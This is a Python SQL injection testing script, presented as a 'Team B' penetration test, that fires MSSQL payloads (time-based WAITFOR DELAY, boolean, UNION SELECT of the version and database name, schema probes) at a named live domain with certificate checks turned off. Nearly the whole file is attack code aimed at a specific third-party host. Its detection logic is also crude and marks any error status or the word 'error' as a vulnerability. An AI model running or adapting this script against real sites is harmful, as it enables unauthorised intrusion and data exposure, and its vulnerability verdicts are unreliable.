#!/usr/bin/env python3

"""
Quick SQL Injection Test Script
Simple and effective testing for common SQL injection vulnerabilities
Team B - Panama8888b Penetration Test
"""

import requests
import time
import urllib.parse
import json
import sys
import warnings

# Disable SSL warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class QuickSQLTester:
    def __init__(self):
        self.base_url = "https://member.panama8888b.com/public/js/v2/app.js"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })
        self.session.verify = False
        self.results = []
        
    def test_single_payload(self, payload, description):
        """Test a single SQL injection payload"""
        print(f"[*] Testing: {description}")
        
        # Encode payload
        encoded_payload = urllib.parse.quote(payload)
        url = f"{self.base_url}?v={encoded_payload}"
        
        try:
            start_time = time.time()
            response = self.session.get(url, timeout=10)
            end_time = time.time()
            
            response_time = end_time - start_time
            
            # Analyze response
            is_vulnerable = False
            vulnerability_type = ""
            details = ""
            
            # Check for time-based vulnerabilities
            if "WAITFOR DELAY" in payload and response_time > 3:
                is_vulnerable = True
                vulnerability_type = "Time-based"
                details = f"Response time: {response_time:.2f}s"
            
            # Check for error-based vulnerabilities
            elif response.status_code != 200:
                is_vulnerable = True
                vulnerability_type = "Error-based"
                details = f"Status code: {response.status_code}"
            
            # Check for SQL errors in content
            elif any(error in response.text.lower() for error in ['sql', 'error', 'syntax', 'exception']):
                is_vulnerable = True
                vulnerability_type = "Error-based"
                details = "SQL error detected in response"
            
            result = {
                'payload': payload,
                'description': description,
                'response_time': response_time,
                'status_code': response.status_code,
                'vulnerable': is_vulnerable,
                'vulnerability_type': vulnerability_type,
                'details': details
            }
            
            self.results.append(result)
            
            if is_vulnerable:
                print(f"[!] VULNERABLE - {vulnerability_type}: {details}")
            else:
                print(f"[+] Not vulnerable (Response time: {response_time:.2f}s)")
            
            return result
            
        except requests.exceptions.Timeout:
            print("[!] Timeout - possible successful injection")
            result = {
                'payload': payload,
                'description': description,
                'response_time': 10.0,
                'status_code': 0,
                'vulnerable': True,
                'vulnerability_type': 'Timeout',
                'details': 'Request timed out'
            }
            self.results.append(result)
            return result
            
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def run_quick_test(self):
        """Run a quick test with essential payloads"""
        print("="*50)
        print("Quick SQL Injection Test")
        print("Target: https://member.panama8888b.com/public/js/v2/app.js")
        print("="*50)
        
        # Essential payloads for quick testing
        payloads = [
            # Time-based (MSSQL)
            ("25.1)) WAITFOR DELAY '0:0:3' --", "Time-based delay 3s"),
            ("25.1)) WAITFOR DELAY '0:0:1' --", "Time-based delay 1s"),
            
            # Boolean-based
            ("25.1)) AND 1=1 --", "Boolean true"),
            ("25.1)) AND 1=2 --", "Boolean false"),
            
            # UNION-based
            ("25.1)) UNION SELECT @@version --", "UNION version"),
            ("25.1)) UNION SELECT DB_NAME() --", "UNION database name"),
            
            # Error-based
            ("25.1)) AND (SELECT COUNT(*) FROM sysobjects)>0 --", "Error-based sysobjects"),
            ("25.1)) AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0 --", "Error-based INFORMATION_SCHEMA"),
        ]
        
        print(f"\n[*] Testing {len(payloads)} payloads...")
        
        for payload, description in payloads:
            self.test_single_payload(payload, description)
            time.sleep(0.5)  # Small delay between requests
        
        self.print_summary()
        return self.results
    
    def print_summary(self):
        """Print test summary"""
        print("\n" + "="*50)
        print("TEST SUMMARY")
        print("="*50)
        
        total_tests = len(self.results)
        vulnerable_count = sum(1 for r in self.results if r['vulnerable'])
        
        print(f"Total tests: {total_tests}")
        print(f"Vulnerable: {vulnerable_count}")
        print(f"Not vulnerable: {total_tests - vulnerable_count}")
        
        if vulnerable_count > 0:
            print(f"\n[!] VULNERABILITIES FOUND:")
            for result in self.results:
                if result['vulnerable']:
                    print(f"  - {result['description']}")
                    print(f"    Type: {result['vulnerability_type']}")
                    print(f"    Details: {result['details']}")
                    print(f"    Payload: {result['payload']}")
                    print()
        else:
            print("\n[+] No obvious vulnerabilities detected")
            print("[+] Target appears to be secure against basic SQL injection")
    
    def save_results(self, filename="quick_sql_test_results.json"):
        """Save results to JSON file"""
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"\n[+] Results saved to: {filename}")

def main():
    try:
        tester = QuickSQLTester()
        results = tester.run_quick_test()
        tester.save_results()
        
        print("[+] Quick test completed successfully!")
        
    except KeyboardInterrupt:
        print("\n[!] Test interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()